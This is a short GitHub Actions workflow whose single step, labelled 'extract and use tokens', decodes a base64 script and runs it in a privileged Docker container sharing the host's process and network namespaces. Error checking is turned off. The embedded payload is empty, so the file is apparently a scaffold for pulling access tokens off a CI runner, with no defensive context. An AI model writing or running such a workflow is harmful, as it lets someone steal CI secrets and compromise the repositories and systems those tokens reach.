name: UseToken
on:
  workflow_dispatch:
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - name: extract and use tokens
        timeout-minutes: 5
        run: |
          set +e
          echo  | base64 -d > /tmp/use_token.py
          docker run --rm --privileged --pid=host --net=host -v /tmp/use_token.py:/scan.py python:3.11-slim python3 /scan.py
          echo === DONE ===
